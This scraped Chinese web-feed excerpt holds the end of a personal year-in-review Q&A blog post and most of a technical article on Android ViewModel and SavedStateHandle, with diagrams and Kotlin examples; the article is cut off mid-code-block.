<p><strong>问：你这又是上班又是搞四五个平台，不累吗？每天几点睡啊？</strong> <strong>答：</strong> 讲真话，真的好累，想直接原地躺平。但相比于身体上的累，我更怕那种“一眼望到头”的无聊。我其实没啥高端的时间管理，无非就是下班后，把别人刷短视频的时间用来剪视频，把别人发呆的时间用来想脚本。对我来说，自媒体不是加班，是给我未来更好的生活一个筹码。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9e622e21ed94f499d81cb9bdb334f73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=gg4IcIjb96ua2DPhqWC82kWnuSY%3D" alt="" loading="lazy"/></p>
<p><strong>问：从上海上市公司跳到深圳，中间还经历了试用期离职，当时心态崩过吗？</strong> <strong>答：</strong> 崩过，尤其是七月离职那阵子，之后找工作的无力感，看着同龄人都在晒转正合照，而我自己却在拖着行李箱到处跑。但现在回头看，那是2025年给我的第一课：<strong>不合适要趁早撤。</strong> 现在的955公司让我有精力去干其他事（去爬山、去搞带货），如果当时死磕在那，可能现在我只是个口吐芬芳的牛马打工人。</p>
<p><strong>问：我看你10月买了影石360做抖音还没搞起来，这波算不算“设备党”交了智商税？</strong> <strong>答：</strong> 哈哈，真不至于。虽然抖音现在还是一潭死水，但买了相机之后，我确实更愿意出门社交和记录了。以前出门是“为了走而走”，现在会去思考画面、构图。这几千块钱对我来说不是智商税，为此，我专门写了一份2026年实现清单，用来去尝试做我之前未做过的事，26年接着折腾呗。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/153524834f8440e89a5312b835bde143~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=KUFsiDBahDdJ%2BSPZs6T%2BVLdJyJE%3D" alt="" loading="lazy"/></p>
<p><strong>问：2025年你最大的遗憾是什么？</strong> <strong>答：</strong> 最大的遗憾可能就是在校园期间没有去谈一段真正意义的校园恋爱吧。老粉都知道，我大学几年忙着内卷、学习、找工作，完全没给自己留私生活的时间。毕业后看身边人陆续脱单，确实有点酸。希望2026年，也能遇到我的“蒙娜丽莎”。</p>
<h2 data-id="heading-7"><strong>八、最后</strong></h2>
<p>2025年，我从学生变成了博主，从上海漂到了深圳。 我不觉得25届是“最难的一届”，我觉得我们是“最能折腾的一届”。 2026，咱不求大富大贵，只求这股子折腾劲别熄灭。 我是追，我们2026见！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3de6a78dd9344c8e9e4c2aa410d1de73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=7YX2RTAhCqoAdnZvTzdNV56Wdbc%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解Android ViewModel和SavedStateHandle]]></title>    <link>https://juejin.cn/post/7602205524719222818</link>    <guid>https://juejin.cn/post/7602205524719222818</guid>    <pubDate>2026-02-03T11:33:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602205524719222818" data-draft-id="7602225961095675938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解Android ViewModel和SavedStateHandle"/> <meta itemprop="keywords" content="Android,Android Jetpack"/> <meta itemprop="datePublished" content="2026-02-03T11:33:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Yen"/> <meta itemprop="url" content="https://juejin.cn/user/4037062426633214"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解Android ViewModel和SavedStateHandle
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4037062426633214/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Yen
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T11:33:12.000Z" title="Tue Feb 03 2026 11:33:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、ViewModel</h2>
<p>ViewModel 的核心原理是<strong>通过一个独立于UI（Activity/Fragment）生命周期的容器，来存储和管理界面所需的数据</strong>。其设计的精髓在于<strong>数据与UI生命周期的分离</strong>，由 <code>ViewModelStore</code> 负责在屏幕旋转等配置变更时保留数据。</p>
<p>下面这张流程图清晰地展示了 ViewModel 的创建、存储和生命周期管理的核心机制：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[Activity/Fragment 首次创建] --&gt; B[初始化 ViewModelStore]
    B --&gt; C[通过 ViewModelProvider.get 请求 ViewModel]
    
    C --&gt; D{"ViewModelStore 中&lt;br&gt;是否存在实例？"}
    D -- 是 --&gt; E[返回已存在的实例]
    D -- 否 --&gt; F[通过 Factory 创建新实例]
    F --&gt; G[存入 ViewModelStore 并返回]
    
    E --&gt; H[屏幕旋转等配置变更]
    G --&gt; H
    
    subgraph Z[配置变更期间]
        H --&gt; I["Activity 被销毁，但&lt;br&gt;ViewModelStore 被系统保留"]
        I --&gt; J[新的 Activity 实例被创建&lt;br&gt;并接收到保留的 ViewModelStore]
    end
    
    J --&gt; C
    
    K["Activity 真正销毁&lt;br&gt;（如返回或退出）"] --&gt; L[ViewModelStore.clear&lt;br&gt;触发所有 ViewModel.onCleared]
</code></pre>
<h3 data-id="heading-1">核心原理深度解析</h3>
<p>理解上图中的几个核心组件是关键：</p>
<ul>
<li><strong>ViewModelStore</strong>: 如图中所示，它是一个简单的键值对容器（内部是 <code>HashMap</code>），是 ViewModel 实例的“储藏室”。它的特殊之处在于，当 Activity 因配置变更被销毁重建时，它会被系统通过 <code>onRetainNonConfigurationInstance()</code> 机制临时保留下来，并传递给新的 Activity 实例，从而实现 ViewModel 的“存活”<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.droidcon.com%2F2025%2F12%2F12%2Fviewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2%2F" target="_blank" title="https://www.droidcon.com/2025/12/12/viewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2/" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.droidcon.com%2F2025%2F01%2F13%2Funderstanding-viewmodel-persistence-across-configuration-changes-in-android%2F" target="_blank" title="https://www.droidcon.com/2025/01/13/understanding-viewmodel-persistence-across-configuration-changes-in-android/" ref="nofollow noopener noreferrer"/>。</li>
<li><strong>ViewModelProvider</strong>: 这是获取 ViewModel 的统一入口。它遵循  <strong>“get-or-create”</strong>  模式：当使用 <code>ViewModelProvider(owner).get(MyViewModel::class.java)</code> 时，它会先以类的规范名称为 Key，去属于 <code>owner</code>（如 Activity）的 <code>ViewModelStore</code> 中查找；如果找到就直接返回，如果没找到则通过 <code>Factory</code> 创建并存入 <code>ViewModelStore</code><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.droidcon.com%2F2025%2F12%2F12%2Fviewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2%2F" target="_blank" title="https://www.droidcon.com/2025/12/12/viewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2/" ref="nofollow noopener noreferrer"/>。</li>
<li><strong>viewModelScope</strong>: 这是 ViewModel 的一个 Kotlin 扩展属性，它绑定了一个与 ViewModel 生命周期一致的协程作用域。当 ViewModel 被清除时（<code>onCleared()</code>），此作用域内的所有协程会自动取消，有效避免了内存泄漏和后台任务积压<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.droidcon.com%2F2025%2F12%2F12%2Fviewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2%2F" target="_blank" title="https://www.droidcon.com/2025/12/12/viewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2/" ref="nofollow noopener noreferrer"/>。</li>
</ul>
<h3 data-id="heading-2">🏗️ ViewModel 在架构中的角色与协作</h3>
<p>ViewModel 是 <strong>MVVM（Model-View-ViewModel）</strong>  架构模式的核心组件，负责连接 <strong>View（UI）</strong>  和 <strong>Model（数据层/业务逻辑）</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fandroid-course.cornellappdev.com%2Fchapters%2F7.-mvvm-design-pattern%2F7.1-key-idea" target="_blank" title="https://android-course.cornellappdev.com/chapters/7.-mvvm-design-pattern/7.1-key-idea" ref="nofollow noopener noreferrer"/>。</p>
<ul>
<li>
<p><strong>职责划分</strong>:</p>
<ul>
<li><strong>View (UI控制器)</strong> : 仅负责显示数据和接收用户输入，不处理业务逻辑。</li>
<li><strong>ViewModel</strong>: 负责为 View 准备和暴露 UI 所需的数据状态（State），并处理来自 View 的用户交互事件，向 Model 层发起请求。</li>
<li><strong>Model</strong>: 负责数据获取和持久化（如数据库、网络）。</li>
</ul>
</li>
<li>
<p><strong>数据流</strong>: 通常遵循<strong>单向数据流</strong>原则<a href="https://link.juejin.cn?target=https%3A%2F%2Fandroid-course.cornellappdev.com%2Fchapters%2F7.-mvvm-design-pattern%2F7.1-key-idea" target="_blank" title="https://android-course.cornellappdev.com/chapters/7.-mvvm-design-pattern/7.1-key-idea" ref="nofollow noopener noreferrer"/>：</p>
<ol>
<li><strong>状态下行</strong>：Model 提供数据 -&gt; ViewModel 加工为 UI 状态 -&gt; View 观察并渲染。</li>
<li><strong>事件上行</strong>：View 触发用户事件 -&gt; ViewModel 处理 -&gt; 必要时通知 Model 更新数据。</li>
</ol>
</li>
<li>
<p><strong>与 LiveData/StateFlow 的协作</strong>：<br/>
ViewModel 内部通常使用 <code>MutableLiveData</code> 或 <code>MutableStateFlow</code> 来持有可变的 UI 状态，但对外仅暴露其只读版本（<code>LiveData</code> 或 <code>StateFlow</code>）。这样既保证了数据可被观察，又封装了修改权，确保数据变化只能通过 ViewModel 的特定方法进行，符合单向数据流。</p>
</li>
</ul>
<h3 data-id="heading-3">💡 要点详解</h3>
<h4 data-id="heading-4">基础与原理类</h4>
<ul>
<li>
<p><strong>ViewModel 是什么？解决了什么问题？</strong></p>
<blockquote>
<p>ViewModel 是一个<strong>生命周期感知</strong>的组件，用于以<strong>结构化</strong>的方式存储和管理与 UI 相关的数据。它<strong>核心解决了</strong>屏幕旋转等配置变更导致的数据丢失问题，同时帮助实现了 UI 控制器（Activity/Fragment）与业务逻辑的<strong>关注点分离</strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_34358193%2Farticle%2Fdetails%2F141685543" target="_blank" title="https://blog.csdn.net/qq_34358193/article/details/141685543" ref="nofollow noopener noreferrer"/>。</p>
</blockquote>
</li>
<li>
<p><strong>ViewModel 如何在屏幕旋转后存活？</strong></p>
<blockquote>
<p>其核心机制是 <strong><code>ViewModelStore</code></strong>。配置变更时，Activity 被销毁，但 <code>ViewModelStore</code> 会被系统通过 <code>onRetainNonConfigurationInstance()</code> 机制临时保留下来。新的 Activity 实例创建后，会接收到同一个 <code>ViewModelStore</code>，从而获取到里面保存的 ViewModel 实例<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.droidcon.com%2F2025%2F01%2F13%2Funderstanding-viewmodel-persistence-across-configuration-changes-in-android%2F" target="_blank" title="https://www.droidcon.com/2025/01/13/understanding-viewmodel-persistence-across-configuration-changes-in-android/" ref="nofollow noopener noreferrer"/>。</p>
</blockquote>
</li>
<li>
<p><strong>ViewModel 和 <code>onSaveInstanceState()</code> 的区别？</strong></p>
<blockquote>
<p>这是经典面试题。主要区别在于数据大小、存储位置和用途<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fgitblog_00191%2Farticle%2Fdetails%2F153245612" target="_blank" title="https://blog.csdn.net/gitblog_00191/article/details/153245612" ref="nofollow noopener noreferrer"/>：</p>
<ul>
<li><strong><code>onSaveInstanceState()</code></strong> : 用于保存<strong>少量、可序列化</strong>的 UI 状态（如文本框内容），以应对<strong>系统内存不足、进程被杀</strong>后恢复的场景。数据会序列化到磁盘。</li>
<li><strong>ViewModel</strong>: 用于存储和管理<strong>相对较大、不可序列化</strong>的 UI 数据（如用户列表、网络请求结果），仅在<strong>同一进程内的配置变更</strong>（如旋转）时存活。数据保存在内存中。</li>
</ul>
</blockquote>
</li>
</ul>
<h4 data-id="heading-5">使用与进阶类</h4>
<ul>
<li>
<p><strong>如何正确创建 ViewModel？为何不能直接 <code>new</code>？</strong></p>
<blockquote>
<p>必须通过 <code>ViewModelProvider</code> 来获取实例。如果直接 <code>new</code>，创建的 ViewModel 无法与当前生命周期的所有者（如 Activity）关联，既无法在配置变更时保留，其 <code>viewModelScope</code> 也无法正确销毁，会导致内存泄漏<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fgitblog_00191%2Farticle%2Fdetails%2F153245612" target="_blank" title="https://blog.csdn.net/gitblog_00191/article/details/153245612" ref="nofollow noopener noreferrer"/>。</p>
</blockquote>
</li>
<li>
<p><strong>ViewModel 可以持有 Context 吗？</strong></p>
<blockquote>
<p><strong>避免持有</strong> Activity 等生命周期短的 Context 引用，以防内存泄漏。如果确实需要应用上下文，可以使用 <code>AndroidViewModel</code>（它是 <code>ViewModel</code> 的子类，内部持有 <code>Application</code> Context）。</p>
</blockquote>
</li>
<li>
<p><strong>如何在 Fragment 间共享数据？</strong></p>
<blockquote>
<p>让 Fragments 共享它们宿主 Activity 作用域的 ViewModel。使用 <code>by activityViewModels()</code> 委托来获取同一个实例，从而实现数据共享和通信<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_34358193%2Farticle%2Fdetails%2F141685543" target="_blank" title="https://blog.csdn.net/qq_34358193/article/details/141685543" ref="nofollow noopener noreferrer"/>。</p>
</blockquote>
</li>
<li>
<p><strong>StateFlow 与 LiveData 如何选择？</strong></p>
<blockquote>






























<table><thead><tr><th>特性</th><th>LiveData</th><th>StateFlow</th></tr></thead><tbody><tr><td><strong>生命周期感知</strong></td><td>原生支持，自动管理</td><td>需要配合 <code>repeatOnLifecycle</code> 等手动控制</td></tr><tr><td><strong>数据重放</strong></td><td>默认仅最新值</td><td>始终重放最新值给新订阅者</td></tr><tr><td><strong>协程支持</strong></td><td>有限</td><td>原生支持，基于协程</td></tr><tr><td><strong>适用场景</strong></td><td>简单 UI 状态、Java 项目</td><td>复杂数据流、纯 Kotlin 项目、需要更多操作符</td></tr></tbody></table>
<p>在新项目中，如果全面使用 Kotlin 协程，<strong>更推荐使用 StateFlow</strong>，因为它提供更严格的线程控制和丰富的变换操作<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fgitblog_00191%2Farticle%2Fdetails%2F153245612" target="_blank" title="https://blog.csdn.net/gitblog_00191/article/details/153245612" ref="nofollow noopener noreferrer"/>。如果项目简单或仍需支持 Java，LiveData 仍是好选择。</p>
</blockquote>
</li>
<li>
<p><strong>如何防止 <code>viewModelScope</code> 造成的内存泄漏？</strong></p>
<blockquote>
<p><code>viewModelScope</code> 的设计已经考虑了生命周期，它会在 ViewModel 的 <code>onCleared()</code> 时自动取消。开发者需要注意：</p>
<ol>
<li>不要在 <code>viewModelScope</code> 中启动无限循环的协程。</li>
<li>在协程内部进行耗时操作时，应使用 <code>try/catch</code> 或 <code>CoroutineExceptionHandler</code> 妥善处理异常，避免因未捕获异常导致作用域取消链断裂。</li>
<li>对于需要超出 ViewModel 生命周期的任务（如上传日志），应使用 <code>Application</code> 作用域的协程或其他机制。</li>
</ol>
</blockquote>
</li>
</ul>
<h2 data-id="heading-6">二、SavedStateHandle</h2>
<p>当应用进程被系统杀死（Process Death）后，<code>SavedStateHandle</code> 是确保关键 UI 状态能够恢复的关键组件。它与 ViewModel 集成，提供了一种比 <code>onSaveInstanceState</code> 更优雅、更内聚的数据保存方案。</p>
<h3 data-id="heading-7">📉 进程死亡 vs. 配置变更</h3>
<p>首先必须明确这两者的根本区别，这也是理解 <code>SavedStateHandle</code> 必要性的前提：</p>


























<table><thead><tr><th>场景</th><th>触发条件</th><th>数据存储位置</th><th>ViewModel 是否存活</th><th>恢复机制</th></tr></thead><tbody><tr><td><strong>配置变更</strong></td><td>屏幕旋转、语言切换、深色模式切换等。</td><td><strong>内存</strong> 中（通过<code>ViewModelStore</code>保留）。</td><td><strong>是</strong>，ViewModel实例被保留。</td><td><strong>自动</strong>，系统重建Activity并重新关联同一个ViewModel。</td></tr><tr><td><strong>进程死亡</strong></td><td>系统资源不足、用户长时间切到后台、应用发生崩溃。</td><td><strong>磁盘</strong> 上（由系统将Bundle写入磁盘）。</td><td><strong>否</strong>，整个应用进程被销毁，内存清空。</td><td><strong>手动</strong>，系统重建Activity和ViewModel，开发者需从<code>SavedStateHandle</code>恢复数据。</td></tr></tbody></table>
<p>简单来说，<code>SavedStateHandle</code> 就是 ViewModel 为应对进程死亡场景而配备的“<strong>逃生背包</strong>”。它允许你将必要的状态（如当前列表的滚动位置、临时填写的表单内容）打包存盘，在用户回来时恢复现场。</p>
<h3 data-id="heading-8">🧩 SavedStateHandle 核心原理与工作流程</h3>
<p>其核心原理是：<strong>将数据保存到系统管理的 <code>Bundle</code> 中，该 Bundle 最终会通过 Activity 的 <code>onSaveInstanceState()</code> 机制写入磁盘，并在重建时恢复</strong>。</p>
<p>它的工作流程可以通过下图完整展示：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A["用户在界面操作&lt;br&gt;（如编辑、滚动）"] --&gt; B["ViewModel 通过 SavedStateHandle&lt;br&gt;更新状态 (如 set)"]
    B --&gt; C[SusavedStateHandle 将数据存入&lt;br&gt;内部 Bundle]
    
    subgraph D [进程死亡与恢复周期]
        D1[系统因内存不足&lt;br&gt;杀死应用进程] --&gt; D2[触发 Activity.onSaveInstanceState&lt;br&gt;SavedStateRegistry 将 Bundle 写入磁盘]
        D2 --&gt; D3["用户返回，系统重建进程"]
        D3 --&gt; D4[创建新 ViewModel 实例&lt;br&gt;并注入恢复的 Bundle]
    end
    
    C -.-&gt;|"“自动关联”"| D2
    D4 --&gt; E[新 ViewModel 的 SavedStateHandle&lt;br&gt;包含恢复的数据]
    E --&gt; F[UI 通过 LiveData/StateFlow&lt;br&gt;观察到恢复的状态并刷新]
</code></pre>
<p><strong>关键实现细节</strong>：</p>
<ol>
<li><strong>自动序列化</strong>：<code>SavedStateHandle</code> 内部使用 <code>BaseSavedStateRegistry</code>，能自动处理可序列化（<code>Serializable</code>/<code>Parcelable</code>）的数据类型。对于复杂对象，需要手动转换（如转为 JSON 字符串）。</li>
<li><strong>与 ViewModel 集成</strong>：当通过 <code>ViewModelProvider</code> 创建带有 <code>SavedStateHandle</code> 参数的 ViewModel 时，系统会自动将恢复的 Bundle 注入。</li>
<li><strong>自定义保存逻辑</strong>：通过 <code>SavedStateRegistry</code> 的 <code>registerSavedStateProvider</code> 方法，可以在保存时刻动态生成要保存的状态，适用于那些无法实时同步到 <code>SavedStateHandle</code> 的复杂数据。</li>
</ol>
<h3 data-id="heading-9">⚖️ 与传统 onSaveInstanceState 的对比</h3>
<p><code>SavedStateHandle</code> 在架构上更加先进：</p>



































<table><thead><tr><th>方面</th><th>传统 <code>onSaveInstanceState</code></th><th><strong>ViewModel + SavedStateHandle</strong></th></tr></thead><tbody><tr><td><strong>保存位置</strong></td><td>Activity/Fragment 中。</td><td><strong>ViewModel</strong> 中，与数据逻辑放在一起。</td></tr><tr><td><strong>职责分离</strong></td><td>违反单一职责，UI控制器需要关心数据保存。</td><td>符合关注点分离，ViewModel负责数据持久化。</td></tr><tr><td><strong>数据访问</strong></td><td>需要在<code>onCreate</code>中读取Bundle并手动分发。</td><td><strong>可观察</strong>，通过<code>getLiveData()</code>直接暴露给UI观察。</td></tr><tr><td><strong>类型安全</strong></td><td>从Bundle存取数据需要键名，容易出错。</td><td>通过键值对存取，并与LiveData/StateFlow结合，类型更安全。</td></tr><tr><td><strong>测试便利性</strong></td><td>难以模拟系统保存和恢复的Bundle。</td><td>ViewModel可以独立测试，<code>SavedStateHandle</code>可轻松模拟。</td></tr></tbody></table>
<h3 data-id="heading-10">🛠️ 在 ViewModel 中使用 SavedStateHandle</h3>
<p>在 ViewModel 的构造函数中添加 <code>SavedStateHandle</code> 参数即可使用：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. 在 ViewModel 中接收 SavedStateHandle</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> savedStateHandle: SavedStateHandle
) : ViewModel() {

    <span class="hljs-comment">// 2. 定义状态键（推荐使用常量）</span>
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> SEARCH_QUERY_KEY = <span class="hljs-string">"search_query"</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> SELECTED_ITEM_ID_KEY = <span class="hljs-string">"selected_item_id"</span>
    }

    <span class="hljs-comment">// 3. 方式一：获取一个与状态绑定的 LiveData</span>
    <span class="hljs-comment">// 初始值来自 savedStateHandle（如果进程死亡后恢复，则有值；否则为默认值）</span>
    <span class="hljs-keyword">val</span> searchQuery: LiveData&lt;String&gt; = 
        savedStateHandle.getLiveData(SEARCH_QUERY_KEY, <span class="hljs-string">""</span>)

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateSearchQuery</span><span class="hljs-params">(query: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-comment">// 更新 LiveData 的值，同时会自动保存到 SavedStateHandle</span>
        savedStateHandle[SEARCH_QUERY_KEY] = query
    }

    <span class="hljs-comment">// 4. 方式二：获取一个与状态绑定的 StateFlow (推荐用于 Kotlin 项目)</span>
    <span class="hljs-keyword">val</span> selectedItemId: StateFlow&lt;<span class="hljs-built_in">Int</span>?&gt; = 
        savedStateHandle.getStateFlow(SELECTED_ITEM_ID_KEY, <span class="hljs-literal">null</span>)

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">selectItem</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span> {
        savedStateHandle[SELECTED_ITEM_ID_KEY] = id
    }

    <span class="hljs-comment">// 5. 方式三：直接存取（适用于不需要观察的简单数据）</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">saveTempData</span><span class="hljs-params">(value: <span class="hljs-type">String</span>)</span></span> {
        savedStateHandle[<span class="hljs-string">"temp_key"</span>] = value
    }
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getTempData</span><span class="hljs-params">()</span></span>: String? = savedStateHandle.<span class="hljs-keyword">get</span>&lt;String&gt;(<span class="hljs-string">"temp_key"</span>)

    <span class="hljs-comment">// 6. 移除不需要持久化的数据</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">clearTempData</span><span class="hljs-params">()</span></span> {
        savedStateHandle.remove(<span class="hljs-string">"temp_key"</span>)
    }
}
</code></pre>
<p>在 Activity/Fragment 中，你无需做任何特殊处理，像普通 ViewModel 一样获取即可：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Activity/Fragment 中，像往常一样获取 ViewModel</span>
<span class="hljs-comment">// 系统会自动处理 SavedStateHandle 的注入</span>
